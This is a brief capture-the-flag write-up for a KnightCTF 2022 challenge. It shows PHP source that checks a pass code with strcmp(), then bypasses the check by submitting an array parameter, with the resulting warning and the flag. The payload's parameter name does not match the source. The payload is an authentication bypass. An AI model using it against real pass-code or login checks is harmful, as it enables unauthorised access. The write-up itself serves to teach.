# Kinght CTF - Find Pass Code - 1

Inspect html code, we can see a comment:
```
Hi Serafin, I learned something new today. 
I build this website for you to verify our KnightCTF 2022 pass code. You can view the source code by sending the source param
```
Ok, let's try that:
path: http://159.223.166.39:9000/?source=
```php
<?php
require "flag.php";
if (isset($_POST["pass_code"])) {
    if (strcmp($_POST["pass_code"], $flag) == 0) {
        echo "KCTF Flag : {$flag}";
    } else {
        echo "Oh....My....God. You entered the wrong pass code.<br>";
    }
}
if (isset($_GET["source"])) {
    print show_source(__FILE__);
}

?>
```
Php strcmp() function, typical huh!
This function return 0 when 2 string compare equal(case-sensitive) but this it really easy to bypass, if arg is an array instead of string --> strcmp return false which equal to 0.
**payload**: passcode[]=1

*Warning*: strcmp() expects parameter 1 to be string, array given in /var/www/html/index.php on line 4

**KCTF Flag** : KCTF{ShOuLd_We_UsE_sTrCmP_lIkE_tHaT}
